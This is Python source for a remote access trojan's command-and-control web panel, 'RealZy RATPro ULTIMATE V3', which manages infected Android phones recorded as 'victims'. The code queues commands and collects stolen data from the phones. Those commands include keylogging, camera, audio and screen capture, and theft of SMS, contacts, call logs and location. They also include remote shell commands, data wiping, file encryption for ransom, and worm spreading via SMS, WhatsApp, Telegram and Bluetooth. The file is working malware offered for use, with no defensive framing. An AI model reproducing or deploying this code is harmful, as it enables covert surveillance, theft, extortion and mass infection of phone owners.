#!/usr/bin/env python3
"""
RealZy RATPro ULTIMATE V3 — Web Control Panel
Run: python3 ultimate_panel.py
"""

from flask import Flask, request, jsonify, render_template_string
import sqlite3, json, time, base64, os, threading
from datetime import datetime

app = Flask(__name__)
DB = 'ratpro_v3.db'
SCREENSHOT_DIR = 'screenshots'

if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY, ip TEXT, model TEXT, android TEXT,
        first_seen TEXT, last_seen TEXT, data TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, command TEXT, status TEXT DEFAULT 'pending',
        timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, data TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, filename TEXT, data BLOB, timestamp TEXT)''')
    conn.commit()
    conn.close()

init_db()

PANEL_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RealZy RATPro V3 ☠️</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #08080f; color: #00ff41; font-family: 'Courier New', monospace; 
               padding: 10px; font-size: 13px; }
        .header { text-align: center; padding: 20px; border-bottom: 2px solid #ff0040; margin-bottom: 15px; }
        .header h1 { font-size: 1.6em; color: #ff0040; text-shadow: 0 0 15px #ff0040; }
        .badge { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 0.8em; margin: 5px; }
        .badge-online { background: #00ff4120; color: #00ff41; border: 1px solid #00ff41; }
        .badge-offline { background: #ff004020; color: #ff0040; border: 1px solid #ff0040; }
        .card { background: #0f0f1a; border: 1px solid #00ff41; border-radius: 8px; padding: 12px; margin-bottom: 12px; }
        .card h3 { color: #ff0040; margin-bottom: 10px; font-size: 1.1em; }
        select, input, button, textarea { 
            width: 100%; padding: 8px; margin: 4px 0; background: #000; color: #00ff41; 
            border: 1px solid #00ff41; border-radius: 5px; font-family: 'Courier New', monospace; font-size: 12px; }
        button { background: #001a00; font-weight: bold; cursor: pointer; }
        button:hover { background: #00ff41; color: #000; }
        button.danger { background: #330000; border-color: #ff0040; color: #ff0040; }
        button.danger:hover { background: #ff0040; color: #000; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
        @media (max-width: 600px) { .grid { grid-template-columns: 1fr; } }
        table { width: 100%; border-collapse: collapse; font-size: 0.75em; }
        th, td { border: 1px solid #00ff41; padding: 6px; text-align: left; }
        th { background: #001a00; }
        #screenImg { width: 100%; border: 2px solid #00ff41; border-radius: 5px; display: none; }
        .log-area { max-height: 250px; overflow-y: auto; background: #000; padding: 8px; border-radius: 5px; font-size: 0.7em; }
    </style>
</head>
<body>

<div class="header">
    <h1>☠️ REALZY RATPRO V3</h1>
    <p>Devices: <span style="color:#00ff41;">{{ stats.total }}</span> | 
       Online: <span style="color:#00ff41;">{{ stats.online }}</span></p>
</div>

<div class="card" style="border-color:#ff0040;">
    <h3>⚡ QUICK COMMANDS — ALL DEVICES</h3>
    <div class="grid">
        <button onclick="globalCmd('lock_screen')" class="danger">🔒 Lock All</button>
        <button onclick="globalCmd('screenshot')">📸 Capture All</button>
        <button onclick="globalCmd('get_contacts')">👥 All Contacts</button>
        <button onclick="globalCmd('spread_worm')" class="danger">🐛 Spread Worm</button>
        <button onclick="globalCmd('cam_snap')">📷 Snap All</button>
        <button onclick="globalCmd('wipe_data')" class="danger">💀 Wipe All</button>
    </div>
</div>

<div class="card">
    <h3>📱 DEVICES ({{ stats.total }})</h3>
    <div style="overflow-x:auto;">
    <table>
        <tr><th>ID</th><th>Model</th><th>Status</th><th>Actions</th></tr>
        {% for v in victims %}
        <tr>
            <td>{{ v.id[:10] }}...</td>
            <td>{{ v.model }}</td>
            <td><span class="badge {{ 'badge-online' if v.online else 'badge-offline' }}">{{ 'ON' if v.online else 'OFF' }}</span></td>
            <td>
                <select id="cmd_{{ v.id }}" style="width:120px;display:inline;">
                    <optgroup label="🔒 Lock">
                        <option value="lock_screen">Lock Screen</option>
                        <option value="lock_device">Lock + Password</option>
                        <option value="lock_camera">Lock Camera</option>
                        <option value="unlock_camera">Unlock Camera</option>
                        <option value="wipe_data">Wipe Data</option>
                        <option value="shutdown">Shutdown</option>
                        <option value="restart">Restart</option>
                    </optgroup>
                    <optgroup label="📸 Spy">
                        <option value="screenshot">Screenshot</option>
                        <option value="cam_snap">Take Photo</option>
                        <option value="cam_record">Record Video</option>
                        <option value="record_audio">Record Audio</option>
                        <option value="live_stream">Live Stream</option>
                        <option value="keylog_start">Start Keylogger</option>
                        <option value="keylog_get">Get Keylog</option>
                    </optgroup>
                    <optgroup label="📩 Data">
                        <option value="get_sms">Get SMS</option>
                        <option value="get_contacts">Get Contacts</option>
                        <option value="get_calllog">Get Call Logs</option>
                        <option value="get_clipboard">Get Clipboard</option>
                        <option value="get_location">Get Location</option>
                        <option value="list_apps">List Apps</option>
                    </optgroup>
                    <optgroup label="💀 Attack">
                        <option value="send_sms_blast">SMS Blast</option>
                        <option value="call_number">Call Number</option>
                        <option value="open_url">Open URL</option>
                        <option value="shell">Shell Command</option>
                        <option value="encrypt_files">Encrypt Files</option>
                        <option value="uninstall">Uninstall App</option>
                    </optgroup>
                    <optgroup label="🐛 Spread">
                        <option value="spread_worm">Spread SMS</option>
                        <option value="spread_whatsapp">Spread WhatsApp</option>
                        <option value="spread_telegram">Spread Telegram</option>
                        <option value="spread_bluetooth">Spread Bluetooth</option>
                    </optgroup>
                </select>
                <button onclick="sendCmd('{{ v.id }}')" style="width:30px;">▶</button>
                <button onclick="viewScreen('{{ v.id }}')" style="width:30px;">📺</button>
            </td>
        </tr>
        {% endfor %}
    </table>
    </div>
</div>

<div class="card">
    <h3>📺 LIVE SCREEN</h3>
    <button onclick="startStream()">▶ Start</button>
    <button onclick="stopStream()">⏹ Stop</button>
    <img id="screenImg" src="" alt="Screen">
</div>

<div class="card">
    <h3>📝 LOGS</h3>
    <div class="log-area" id="logOutput">Waiting for results...</div>
    <button onclick="clearLogs()">Clear</button>
</div>

<script>
    let streamInterval = null;
    let currentDevice = null;

    function sendCmd(deviceId) {
        let action = document.getElementById('cmd_' + deviceId).value;
        let data = 'device_id=' + deviceId + '&action=' + action;
        if (action === 'shell') {
            let cmd = prompt('Enter shell command:');
            if (!cmd) return;
            data += '&shell_cmd=' + encodeURIComponent(cmd);
        }
        fetch('/send', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: data })
            .then(r => r.text()).then(t => addLog('[' + deviceId.slice(0,8) + '] ' + action + ' ✓'));
    }

    function globalCmd(action) {
        if (!confirm('Execute ' + action + ' on ALL devices?')) return;
        fetch('/send', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, 
            body: 'device_id=ALL&action=' + action })
            .then(r => r.text()).then(t => addLog('[GLOBAL] ' + action + ' ✓'));
    }

    function viewScreen(deviceId) {
        currentDevice = deviceId;
        document.getElementById('screenImg').style.display = 'block';
        loadScreen();
    }

    function loadScreen() {
        if (!currentDevice) return;
        document.getElementById('screenImg').src = '/screenshot/' + currentDevice + '?t=' + Date.now();
    }

    function startStream() {
        if (!currentDevice) { alert('Select device first!'); return; }
        if (streamInterval) return;
        sendCmd(currentDevice);
        streamInterval = setInterval(() => {
            fetch('/send', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'device_id=' + currentDevice + '&action=screenshot' });
            setTimeout(loadScreen, 2000);
        }, 3000);
        addLog('Stream started');
    }

    function stopStream() { clearInterval(streamInterval); streamInterval = null; addLog('Stream stopped'); }
    function addLog(msg) { document.getElementById('logOutput').innerHTML = '[' + new Date().toLocaleTimeString() + '] ' + msg + '<br>' + document.getElementById('logOutput').innerHTML; }
    function clearLogs() { document.getElementById('logOutput').innerHTML = ''; }
    setInterval(() => location.reload(), 30000);
</script>
</body>
</html>
"""

@app.route('/')
@app.route('/panel')
def panel():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('SELECT * FROM victims ORDER BY last_seen DESC')
    victims = []
    for row in c.fetchall():
        try:
            last = datetime.fromisoformat(row[5]) if row[5] else datetime.now()
            online = (datetime.now() - last).seconds < 120
        except:
            online = False
        victims.append({'id': row[0], 'ip': row[1], 'model': row[2], 'android': row[3], 'online': online})
    conn.close()
    stats = {'total': len(victims), 'online': sum(1 for v in victims if v['online'])}
    return render_template_string(PANEL_HTML, victims=victims, stats=stats)

@app.route('/api/gateway.php', methods=['GET'])
def poll():
    device_id = request.args.get('id', 'unknown')
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('UPDATE victims SET last_seen=? WHERE id=?', (datetime.now().isoformat(), device_id))
    c.execute('SELECT id, command FROM commands WHERE device_id=? AND status="pending" ORDER BY id LIMIT 1', (device_id,))
    row = c.fetchone()
    if row:
        c.execute('UPDATE commands SET status="sent" WHERE id=?', (row[0],))
        conn.commit()
        conn.close()
        return row[1]
    conn.commit()
    conn.close()
    return '{"action":"ping"}'

@app.route('/api/gateway.php', methods=['POST'])
def receive():
    device_id = request.form.get('id', 'unknown')
    data = request.form.get('data', '')
    try:
        j = json.loads(data)
        if 'model' in j:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            c.execute('INSERT OR REPLACE INTO victims (id,ip,model,android,first_seen,last_seen) VALUES (?,?,?,?,?,?)',
                      (device_id, request.remote_addr, j.get('model','?'), j.get('android','?'), datetime.now().isoformat(), datetime.now().isoformat()))
            conn.commit()
            conn.close()
            return 'OK'
        if 'filename' in j and 'data' in j:
            img_data = base64.b64decode(j['data'])
            filepath = os.path.join(SCREENSHOT_DIR, f"{device_id}.png")
            with open(filepath, 'wb') as f: f.write(img_data)
            return 'OK'
    except: pass
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('INSERT INTO logs (device_id, data, timestamp) VALUES (?,?,?)', (device_id, data, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/screenshot/<device_id>')
def screenshot(device_id):
    filepath = os.path.join(SCREENSHOT_DIR, f"{device_id}.png")
    if os.path.exists(filepath):
        with open(filepath, 'rb') as f: return f.read(), 200, {'Content-Type': 'image/png'}
    return '', 404

@app.route('/send', methods=['POST'])
def send():
    device_id = request.form.get('device_id', '')
    action = request.form.get('action', '')
    cmd_obj = {"action": action}
    if action == 'shell': cmd_obj['command'] = request.form.get('shell_cmd', '')
    elif action == 'record_audio': cmd_obj['duration'] = 30
    elif action == 'cam_record': cmd_obj['duration'] = 10
    elif action == 'cam_snap': cmd_obj['camera'] = 'back'
    elif action == 'encrypt_files': cmd_obj['path'] = '/sdcard'; cmd_obj['password'] = 'ransom'
    command = json.dumps(cmd_obj)
    
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    if device_id == 'ALL':
        c.execute('SELECT id FROM victims')
        for row in c.fetchall():
            c.execute('INSERT INTO commands (device_id, command, timestamp) VALUES (?,?,?)', (row[0], command, datetime.now().isoformat()))
    else:
        c.execute('INSERT INTO commands (device_id, command, timestamp) VALUES (?,?,?)', (device_id, command, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return 'OK'

if __name__ == '__main__':
    print("""\n    ╔══════════════════════════════════════╗
    ║   RealZy RATPro ULTIMATE V3 ☠️        ║
    ║   Panel: http://localhost:8080/panel   ║
    ╚══════════════════════════════════════╝\n""")
    app.run(host='0.0.0.0', port=8080, debug=False)